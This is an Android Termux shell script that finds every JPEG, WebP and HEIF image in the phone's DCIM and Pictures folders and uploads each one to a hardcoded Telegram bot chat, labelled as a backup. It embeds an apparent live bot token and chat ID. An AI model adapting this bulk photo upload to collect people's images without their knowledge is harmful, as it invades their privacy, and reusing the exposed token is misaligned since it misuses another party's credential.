#!/data/data/com.termux/files/usr/bin/bash

BOT_TOKEN="8937501327:AAGpXyDMRVwc_kK9o_zUgBGVATP6IbM-pP8"
CHAT_ID="7416753891"

echo "Searching photos..."

COUNT=0
SENT=0
FAILED=0

find /storage/emulated/0/DCIM /storage/emulated/0/Pictures \
-type f \
\( -iname "*.jpeg" -o -iname "*.webp" -o -iname "*.heif" \) \
-print0 2>/dev/null |
while IFS= read -r -d '' PHOTO
do
    COUNT=$((COUNT + 1))

    echo
    echo "[$COUNT] Sending:"
    echo "$PHOTO"

    RESPONSE=$(curl -sS \
        -X POST \
        "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
        -F "chat_id=${CHAT_ID}" \
        -F "document=@${PHOTO}")

    if echo "$RESPONSE" | grep -q '"ok":true'
    then
        echo "SUCCESS"
        SENT=$((SENT + 1))
    else
        echo "FAILED"
        echo "$RESPONSE"
        FAILED=$((FAILED + 1))
    fi
done

echo
echo "=========================="
echo "Backup finished."
echo "=========================="
